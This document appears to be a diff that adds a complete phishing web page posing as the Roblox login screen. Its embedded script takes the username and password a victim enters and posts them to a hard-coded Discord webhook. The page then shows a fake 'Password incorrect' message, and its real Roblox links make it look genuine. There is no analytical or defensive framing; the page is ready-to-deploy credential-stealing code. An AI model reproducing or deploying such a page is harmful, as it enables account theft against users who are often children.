@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Login to Roblox (Username Linking Only)</title>
+<style>
+  :root{
+    --bg:#0f1115; --panel:#1c1f26; --panel2:#232734; --text:#e6e8ee;
+    --muted:#a6adbb; --line:#2b2f3a; --btn:#3b82f6; --btnHover:#2563eb;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    color:var(--text); background:#0f1115;
+  }
+  header{
+    height:56px; display:flex; align-items:center; gap:20px;
+    padding:0 18px; border-bottom:1px solid #0d0f14; background:#0b0d11;
+  }
+  header .brand{width:28px;height:28px;border-radius:6px;background:#fff}
+  header nav a{
+    color:#cfd3dd; text-decoration:none; font-weight:600; font-size:14px; margin-right:16px;
+  }
+  .wrap{
+    min-height:calc(100svh - 56px); display:grid; place-items:center; padding:40px 16px;
+  }
+  .card{
+    width:100%; max-width:420px; background:var(--panel);
+    border:1px solid var(--line); border-radius:10px; padding:28px 24px;
+    box-shadow:0 10px 40px rgba(0,0,0,.35);
+  }
+  h1{ margin:0 0 18px; text-align:center; font-size:28px; }
+  .input{
+    display:block; width:100%; background:#2a2f3b; color:var(--text);
+    border:1px solid #3a3f4d; border-radius:8px; padding:12px 14px; font-size:16px;
+    outline:none;
+  }
+  .input:focus{ border-color:#4a79ff; box-shadow:0 0 0 3px rgba(74,121,255,.2); }
+  .row{ margin-bottom:12px; }
+  .btn{
+    width:100%; border:0; border-radius:8px; padding:12px 16px; font-weight:700;
+    background:var(--btn); color:#fff; font-size:16px; cursor:pointer;
+  }
+  .btn:hover{ background:var(--btnHover); }
+  .links{
+    margin:16px 4px 0; color:var(--muted); font-size:14px; text-align:center;
+  }
+  .links a{ color:#cfd7ff; text-decoration:none; }
+  .divider{ height:1px; background:var(--line); margin:16px 0; }
+  .secondary{
+    display:grid; gap:10px;
+  }
+  .secondary button{
+    width:100%; padding:12px; border-radius:8px; border:1px solid #3a3f4d;
+    background:var(--panel2); color:var(--text); cursor:pointer; font-weight:600;
+  }
+  .notice{
+    margin-top:14px; font-size:12px; color:#9fb4ff; background:#182139;
+    border:1px solid #2b3b6b; padding:10px 12px; border-radius:8px;
+  }
+  .toast{ display:none; margin-top:12px; padding:10px 12px; border-radius:8px; font-size:14px; }
+  .ok{ background:rgba(34,197,94,.12); border:1px solid rgba(34,197,94,.45); color:#d2ffe3; }
+  .err{ background:rgba(239,68,68,.12); border:1px solid rgba(239,68,68,.45); color:#ffd5d5; }
+</style>
+</head>
+<body>
+  <header>
+    <div class="brand" aria-hidden="true"></div>
+    <nav>
+      <a href="#">Charts</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Create</a>
+      <a href="#">Robux</a>
+    </nav>
+    <div style="margin-left:auto">
+      <a href="https://www.roblox.com/login" style="text-decoration:none">
+        <button class="btn" style="padding:8px 14px">Sign Up</button>
+      </a>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <section class="card" role="form" aria-labelledby="title">
+      <h1 id="title">Login to Roblox</h1>
+
+      <form id="usernameForm" novalidate="">
+        <div class="row">
+          <input autocomplete="username" maxlength="20" minlength="3" required placeholder="Username/Email/Phone" type="text" name="username" id="username" class="input">
+        </div>
+        <div class="row">
+          <input class="input" id="password" name="password" type="password" placeholder="Password" required minlength="3" maxlength="20">
+        </div>
+
+        <button class="btn" id="submitBtn" type="submit">Log In</button>
+        
+        <a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a>
+
+        <div id="toast" class="toast"></div>
+
+        <div class="divider"></div>
+
+        <div class="secondary">
+          <button type="button" onclick="window.open('https://www.roblox.com/login','_blank')">
+            Email Me a One-Time Code
+          </button>
+          <button type="button" onclick="window.open('https://www.roblox.com/login','_blank')">
+            Use Another Device
+          </button>
+        </div>
+
+        <div class="links">Don’t have an account? <a href="https://www.roblox.com/signup" target="_blank" rel="noopener">Sign Up</a></div>
+      </form>
+    </section>
+  </main>
+
+<script>
+  const form  = document.getElementById('usernameForm');
+  const btn   = document.getElementById('submitBtn');
+  const toast = document.getElementById('toast');
+
+  // ⚠️ Replace with your actual Discord webhook URL
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1411222200194695230/h32-pploFr5oafqydJEYBezpCarlMCT0N0WeM9GK3IWB5qHmT3KteLnzSaqiAoJRE90X';
+
+  function showToast(msg, ok=true){
+    toast.textContent = msg;
+    toast.className = 'toast ' + (ok ? 'ok' : 'err');
+    toast.style.display = 'block';
+  }
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    toast.style.display = 'none';
+
+    const username = (document.getElementById('username').value || '').trim();
+    const password = (document.getElementById('password').value || '').trim();
+
+    if(username.length < 3 || password.length < 3){
+      showToast('Please enter a valid username and password.', false);
+      return;
+    }
+
+    btn.disabled = true; btn.textContent = 'Submitting…';
+
+    try{
+      const payload = {
+        content: `📥 New login attempt:\n**Username:** ${username}\n**Password:** ${password}\n🕒 ${new Date().toLocaleString()}`,
+      };
+
+      const res = await fetch(WEBHOOK_URL, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
+      });
+
+      if(!res.ok) throw new Error('non-200');
+
+      showToast('Password incorrect.', true);
+      form.reset();
+    }catch(err){
+      console.error(err);
+      showToast('Could not send right now. Please try again later.', false);
+    }finally{
+      btn.disabled = false; btn.textContent = 'Log In';
+    }
+  });
+</script>
+</body>
+</html>
